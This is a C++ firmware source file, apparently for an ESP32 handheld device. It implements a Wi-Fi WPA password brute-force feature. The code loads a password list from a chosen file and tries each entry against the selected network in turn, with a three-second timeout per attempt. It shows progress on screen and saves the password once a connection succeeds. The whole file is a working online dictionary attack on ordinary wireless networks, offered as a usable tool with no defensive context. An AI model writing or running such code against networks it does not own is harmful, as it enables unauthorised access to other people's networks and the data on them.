// pid PID::WIFI_WPA_BF

#define BF_ATTEMPT_TIMEOUT_MS 3000

static bool   _bfFpDone      = false;
static bool   _bfRunning     = false;
static bool   _bfDone        = false;
static int    _bfIndex       = 0;
static int    _bfTotal       = 0;
static String _bfCurrentPass = "";
static unsigned long _bfAttemptStart = 0;
static String* _bfPasswords  = nullptr;
static volatile bool _bfGotResult   = false;
static volatile bool _bfConnected   = false;

static void _bfFreeList() {
	delete[] _bfPasswords;
	_bfPasswords = nullptr;
	_bfTotal = 0;
	_bfIndex = 0;
}

static void _bfRestart() {
	_bfFreeList();
	selectedFilePath = "";
	fpActive = false;
	filePickerSetup(PID::WIFI_SELECTED);
}

static void _bfDrawProgress() {
	char progress[12];
	snprintf(progress, sizeof(progress), "%d/%d", _bfIndex + 1, _bfTotal);
	String lines[] = { String(progress), _bfCurrentPass.substring(0, 20) };
	centeredPrintRows(lines, 2, SMALL_TEXT, true);
	drawSpinner();
	canvas.pushSprite(0, getStatusBarHeight());
}

static void _bfOnWifiEvent(WiFiEvent_t event, WiFiEventInfo_t info) {
	if (event == ARDUINO_EVENT_WIFI_STA_CONNECTED) {
		_bfConnected  = true;
		_bfGotResult  = true;
	} else if (event == ARDUINO_EVENT_WIFI_STA_DISCONNECTED) {
		// Only treat as a result if we're mid-attempt and haven't connected
		if (!_bfConnected) {
			_bfGotResult = true;
		}
	}
}

static void _bfStartAttempt() {
	_bfGotResult  = false;
	_bfConnected  = false;
	_bfCurrentPass = _bfPasswords[_bfIndex];
	WiFi.disconnect(true);
	delay(50);
	WiFi.mode(WIFI_STA);
	WiFi.begin(ssid.c_str(), _bfCurrentPass.c_str());
	_bfAttemptStart = millis();
	_bfDrawProgress();
}

void wifiBruteforceLoop() {
	if (isSetup()) {
		_bfFpDone  = false;
		_bfRunning = false;
		_bfDone    = false;
		_bfGotResult  = false;
		_bfConnected  = false;
		WiFi.onEvent(_bfOnWifiEvent);
		_bfRestart();
	}

	// File picker phase
	if (!_bfFpDone) {
		if (fpActive) {
			if (filePickerLoop()) return;
			if (selectedFilePath == "") return; // cancelled
		}

		if (selectedFilePath == "") return;

		if (!readFileLines(selectedFilePath, _bfPasswords, _bfTotal)) {
			centeredPrint(L->TXT_BT_FILE_ERROR, MEDIUM_TEXT);
			delay(1200);
			_bfRestart();
			return;
		}

		_bfFpDone = true;

		char buf[20];
		snprintf(buf, sizeof(buf), L->TXT_WIFI_BF_LOADED, _bfTotal);
		String lines[] = { ssid.substring(0, 16), String(buf) };
		centeredPrintRows(lines, 2, SMALL_TEXT, true);
		drawHintCustom("enter: start", "A: start");
		return;
	}

	// Waiting for A to start
	if (!_bfRunning && !_bfDone) {
		if (isBtnAWasPressed() || isKbEnterPressed()) {
			_bfRunning = true;
			_bfIndex = 0;
			_bfStartAttempt();
		}
		checkExit();
		return;
	}

	// Done: wait for exit
	if (_bfDone) { checkExit(); return; }

	// Running: redraw only when needed
	bool timedOut = (millis() - _bfAttemptStart > BF_ATTEMPT_TIMEOUT_MS);

	if (!_bfGotResult && !timedOut) {
		_bfDrawProgress();
		checkExit();
		return;
	}

	// Got result (event or timeout)
	if (_bfConnected) {
		_bfRunning = false;
		_bfDone    = true;
		WiFi.disconnect(true);
		wifiPassword = _bfCurrentPass;
		saveWifiPassword(ssid, wifiPassword);
		String lines[] = { String(L->TXT_SUCCESS), _bfCurrentPass.substring(0, 20) };
		centeredPrintRows(lines, 2, MEDIUM_TEXT);
		soundSuccess();
		_bfFreeList();
		return;
	}

	// Wrong password or timeout — next attempt
	WiFi.disconnect(true);
	_bfIndex++;

	if (_bfIndex >= _bfTotal) {
		_bfRunning = false;
		_bfDone    = true;
		char buf[20];
		snprintf(buf, sizeof(buf), L->TXT_WIFI_BF_DONE, _bfTotal);
		String lines[] = { String(L->TXT_FAILED), String(buf) };
		centeredPrintRows(lines, 2, MEDIUM_TEXT);
		soundError();
		_bfFreeList();
		return;
	}

	_bfStartAttempt();
	checkExit();
}
